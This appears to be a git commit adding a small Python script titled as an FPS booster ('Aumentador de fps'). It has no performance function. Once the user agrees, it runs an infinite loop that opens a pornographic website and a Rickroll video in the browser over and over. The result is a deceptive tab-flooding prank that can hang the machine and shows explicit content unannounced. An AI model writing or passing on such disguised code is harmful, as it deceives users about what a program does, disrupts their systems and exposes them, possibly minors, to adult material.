c1ed06efe017d10bffc6f7a8faebd18633b0471a
Stephen musk <78314574+bmurder@users.noreply.github.com>
2021-06-10 01:05:25 -0300

    Aumentador de fps

---
+++ +fps.py
@@ -0,0 +1,20 @@
+import webbrowser
+import os
+
+os.system('clear')
+
+print('powered by: stephen')
+
+print('+fps')
+
+nerdola = input('iniciar contador e aumentador de fps? S/N ')
+
+if (nerdola == 'S' ):
+
+ while True:
+  webbrowser.open('https://www.xvideos.com/')
+
+  webbrowser.open('https://youtu.be/dQw4w9WgXcQ')
+
+else: 
+  print('tabom....')
